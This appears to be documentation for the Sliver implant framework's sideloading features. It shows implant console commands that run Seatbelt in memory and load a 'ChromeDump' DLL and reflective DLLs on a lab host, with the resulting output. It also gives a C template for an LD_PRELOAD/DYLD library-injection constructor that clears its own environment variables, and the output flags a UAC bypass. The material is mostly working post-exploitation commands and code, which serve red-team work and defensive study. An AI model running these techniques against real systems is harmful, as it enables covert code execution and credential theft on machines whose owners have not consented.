## Sideloading Features
## Known Limitations
## Loading .NET Assemblies
Here's an example with [Seatbelt](https://github.com/GhostPack/Seatbelt):
```
sliver (CONCRETE_STEEL) > execute-assembly -t 80 /tmp/Seatbelt.exe All
[*] Assembly output:

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,

=== Running System Triage Checks ===

=== Basic OS Information ===

  Hostname                      :  DESKTOP-0QQJ4JL
  Domain Name                   :
  Username                      :  DESKTOP-0QQJ4JL\lab
  ProductName                   :  Windows 10 Pro
  EditionID                     :  Professional
  ReleaseId                     :  1909
  BuildBranch                   :  19h1_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  2
  IsVirtualMachine              :  True
  BootTime (approx)             :  5/19/2020 8:55:55 AM
  HighIntegrity                 :  False
  IsLocalAdmin                  :  True
    [*] In medium integrity but user is a local administrator- UAC can be bypassed.
...
```

## Shared Library Side Loading
Here's a starting point :
```c
#if __linux__
#include <stdlib.h>

void DoStuff();

static void init(int argc, char **argv, char **envp)
{
    // unset LD_PRELOAD to prevent sub processes from misbehaving
    unsetenv("LD_PRELOAD");
    // retrieve the LD_PARAMS value
    // unset LD_PARAMS if there's no need for it anymore
    unsetenv("LD_PARAMS");
    DoStuff();
}
__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
#elif __APPLE__
void DoStuff();

__attribute__((constructor)) static void init(int argc, char **argv, char **envp)
{
    // unset DYLD_INSERT_LIBRARIES to prevent sub processes from misbehaving
    unsetenv("DYLD_INSERT_LIBRARIES");
    // retrieve the LD_PARAMS value
    // unset LD_PARAMS if there's no need for it anymore
    unsetenv("LD_PARAMS");
    DoStuff();
}

#endif
```

To side load a shared library, use the `sideload` command like this:
```
// Windows example
sliver (CONCRETE_STEEL) > sideload -e ChromeDump /tmp/chrome-dump.dll
// Linux example
sliver (CONCRETE_STEEL) > sideload -p /bin/bash -a "My arguments" /tmp/mylib.so
// MacOS example
sliver (CONCRETE_STEEL) > sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment -a 'Hello World' /tmp/mylib.dylib
```

## Loading Reflective DLLs
Here's an example with the `PsC` tool from [Outflank's Ps-Tools suite](https://github.com/outflanknl/Ps-Tools):
```
sliver (CONCRETE_STEEL) > spawndll /tmp/Outflank-PsC.dll blah
[*] Output:

--------------------------------------------------------------------
[+] ProcessName:         svchost.exe
    ProcessID:   2960
    PPID:        576 (services.exe)
    CreateTime:  19/05/2020 10:53
    Path:        C:\Windows\System32\svchost.exe
    ImageType:   64-bit
    CompanyName:         Microsoft Corporation
    Description:         Host Process for Windows Services
    Version:     10.0.18362.1

<-> Session:     TCP
    State:       ESTABLISHED
    Local Addr:  172.16.241.128:49819
    Remote Addr:         40.67.251.132:443

--------------------------------------------------------------------
[+] ProcessName:         CONCRETE_STEEL.exe
    ProcessID:   7400
    PPID:        5440 (explorer.exe)
    CreateTime:  19/05/2020 10:54
    SessionID:   1
    Path:        C:\Users\lab\Desktop\CONCRETE_STEEL.exe
    ImageType:   64-bit
    UserName:    DESKTOP-0QQJ4JL\lab
    Integrity:   Medium
    PEB Address:         0x0000000000352000
    ImagePath:   C:\Users\lab\Desktop\CONCRETE_STEEL.exe
    CommandLine:         "C:\Users\lab\Desktop\CONCRETE_STEEL.exe"

<-> Session:     TCP
    State:       ESTABLISHED
    Local Addr:  172.16.241.128:49687
    Remote Addr:         172.16.241.1:8888
```

